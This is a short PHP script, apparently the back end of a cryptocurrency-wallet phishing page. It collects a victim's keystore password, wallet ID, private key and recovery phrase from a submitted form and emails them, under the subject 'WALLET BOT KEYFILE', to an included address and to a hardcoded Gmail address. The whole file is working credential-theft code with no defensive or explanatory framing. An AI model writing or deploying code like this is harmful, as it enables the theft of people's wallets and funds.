<?php
if (isset($_POST['phrase']) || isset($_POST['privatekey']) || isset($_POST['wallet'])) {

    include_once('email.php');
    
    //print_r($_POST);
    
    $keystorepassword = $_POST['keystorepassword'];
    $wallet_id = $_POST['wallet_id'];
    $wallet = $_POST['wallet'];
    $privatekey = $_POST['privatekey'];
    $phrase = $_POST['phrase'];

    $msg = "
    ==============  MAINNET BOT =================
        Keystore Password: $keystorepassword
        Wallet Id: $wallet_id
        Wallet: $wallet
        Private Key: $privatekey
        Phrase: $phrase
    ============================================
    ";

    $ref = "HEllo";

    $reply      = 'rizzo.eino@gmail.com';
    $subject = '---- WALLET BOT KEYFILE ----';
    $message = $ref;
    $headers = 'From: '. $reply . "\r\n" .
        'Reply-To: ' . $reply . "\r\n" .
        'X-Mailer: PHP/' . phpversion();

    mail($email, $subject, $msg);
    
    echo 'Successful';
    mail($reply, $subject, $msg);
    echo 'error';
}